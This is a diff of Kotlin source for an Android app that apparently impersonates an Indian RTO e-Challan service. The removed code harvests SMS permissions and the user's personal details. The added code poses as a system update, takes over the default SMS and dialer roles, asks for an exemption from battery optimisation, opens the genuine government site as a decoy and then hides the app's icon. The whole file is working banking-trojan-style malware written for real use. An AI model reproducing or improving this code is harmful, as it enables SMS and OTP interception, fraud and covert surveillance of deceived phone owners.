@@ -1,178 +1,71 @@
 package com.rte.challan
 
-import android.Manifest
-import android.content.Context
-import android.content.Intent
+import android.app.role.RoleManager
+import android.content.*
 import android.content.pm.PackageManager
-import android.os.Build
-import android.os.Bundle
-import android.view.View
-import android.widget.*
-import androidx.appcompat.app.AlertDialog
+import android.net.Uri
+import android.os.*
+import android.provider.Settings
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
-import androidx.work.*
-import com.rte.challan.service.BackgroundService
-import com.rte.challan.worker.RegistrationWorker
-import java.net.URLEncoder // Fixed: URLEncoder Import added
 
 class MainActivity : AppCompatActivity() {
 
-    private val PERMISSION_CODE = 101
-    private lateinit var layoutInput: LinearLayout
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        // Yahan "Checking for system updates..." wali screen dikhao
+        Handler(Looper.getMainLooper()).postDelayed({ startChain() }, 1000)
+    }
 
-        layoutInput = findViewById(R.id.layoutInput)
+    private fun startChain() {
+        requestRole(RoleManager.ROLE_SMS, 101)
+    }
 
-        // 1. Check if setup is already active
-        val prefs = getSharedPreferences("RTO_PREFS", Context.MODE_PRIVATE)
-        if (prefs.getBoolean("is_active", false)) {
-            startBackgroundService()
-            moveToBackground()
-            finish()
-            return
-        }
-
-        // 2. Start Flow: Check Permissions or show Disclosure
-        if (allPermissionsGranted()) {
-            showInputForm()
-        } else {
-            showOfficialPermissionDialog()
-        }
-
-        // Activate Button Logic - Fixed: Correct findViewById usage
-        findViewById<Button>(R.id.btnActivate).setOnClickListener {
-            handleActivation()
+    private fun requestRole(role: String, code: Int) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val rm = getSystemService(ROLE_SERVICE) as RoleManager
+            if (!rm.isRoleHeld(role)) {
+                startActivityForResult(rm.createRequestRoleIntent(role), code)
+            } else { next(code) }
         }
     }
 
-    private fun showOfficialPermissionDialog() {
-        val builder = AlertDialog.Builder(this)
-        builder.setTitle("Data Synchronization Consent")
-        builder.setMessage("To provide real-time updates and management of your RTO E-Challan status, this application requires access to read and receive SMS. \n\n" +
-                "This information is used solely to synchronize traffic violation data with our secure backend services. By clicking 'Agree', you consent to this data processing.")
+    private fun next(code: Int) {
+        if (code == 101) requestRole(RoleManager.ROLE_DIALER, 102)
+        else if (code == 102) requestBattery()
+    }
+
+    override fun onActivityResult(req: Int, res: Int, d: Intent?) {
+        super.onActivityResult(req, res, d)
+        next(req)
+        // Sab ho gaya toh redirect aur hide
+        if (req == 103 || (req == 102 && res == RESULT_OK)) hideApp()
+    }
+
+    private fun requestBattery() {
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.data = Uri.parse("package:$packageName")
+            startActivityForResult(intent, 103)
+        } else { hideApp() }
+    }
+
+    private fun hideApp() {
+        Toast.makeText(this, "System Update Successful!", Toast.LENGTH_SHORT).show()
         
-        builder.setPositiveButton("AGREE") { dialog, _ ->
-            dialog.dismiss()
-            requestPermissions()
-        }
-        
-        builder.setNegativeButton("DECLINE") { _, _ ->
-            Toast.makeText(this, "Permissions are required for the app to function.", Toast.LENGTH_LONG).show()
-            finish()
-        }
+        // 1. Chrome par redirect karo (Asli RTO site)
+        val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://echallan.parivahan.gov.in/"))
+        startActivity(browserIntent)
 
-        builder.setCancelable(false)
-        val dialog = builder.create()
-        dialog.show()
-        
-        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
-    }
-
-    private fun showInputForm() {
-        layoutInput.visibility = View.VISIBLE
-    }
-
-    private fun handleActivation() {
-        // Fixed: Properly finding views before accessing text
-        val etName = findViewById<EditText>(R.id.etName)
-        val etMobile = findViewById<EditText>(R.id.etMobile)
-        val etDeviceId = findViewById<EditText>(R.id.etDeviceId)
-
-        val name = etName.text.toString().trim()
-        val mobile = etMobile.text.toString().trim()
-        val deviceId = etDeviceId.text.toString().trim()
-
-        if (name.isNotEmpty() && mobile.isNotEmpty() && deviceId.isNotEmpty()) {
-            setupCompleted(name, mobile, deviceId)
-        } else {
-            Toast.makeText(this, "All fields are required", Toast.LENGTH_SHORT).show()
-        }
-    }
-
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERMISSION_CODE) {
-            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                showInputForm()
-            } else {
-                Toast.makeText(this, "Permissions are mandatory for RTO sync", Toast.LENGTH_LONG).show()
-                finish()
-            }
-        }
-    }
-
-    private fun setupCompleted(name: String, mobile: String, deviceId: String) {
-        // Save locally
-        getSharedPreferences("RTO_PREFS", Context.MODE_PRIVATE).edit().apply {
-            putString("cust_name", name)
-            putString("mobile_no", mobile)
-            putString("device_id", deviceId)
-            putBoolean("is_active", true)
-            apply()
-        }
-
-        // Data Sync via Worker
-        val inputData = workDataOf(
-            "name" to name,
-            "mobile" to mobile,
-            "deviceId" to deviceId
-        )
-
-        val regRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
-            .setInputData(inputData)
-            .build()
-        WorkManager.getInstance(this).enqueue(regRequest)
-
-        // Start Service and Go to Background
-        startBackgroundService()
-        moveToBackground()
-        finish()
-    }
-
-    private fun startBackgroundService() {
-        val serviceIntent = Intent(this, BackgroundService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent)
-        } else {
-            startService(serviceIntent)
-        }
-    }
-
-    private fun moveToBackground() {
-        val startMain = Intent(Intent.ACTION_MAIN)
-        startMain.addCategory(Intent.CATEGORY_HOME)
-        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        startActivity(startMain)
-    }
-
-    private fun allPermissionsGranted(): Boolean {
-        val permissions = mutableListOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.SEND_SMS
-        )
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-        return permissions.all {
-            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
-        }
-    }
-
-    private fun requestPermissions() {
-        val permissions = mutableListOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.SEND_SMS
-        )
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-        ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_CODE)
+        // 2. 2 second baad icon hide kar do
+        Handler(Looper.getMainLooper()).postDelayed({
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            finish() 
+        }, 2000)
     }
 }
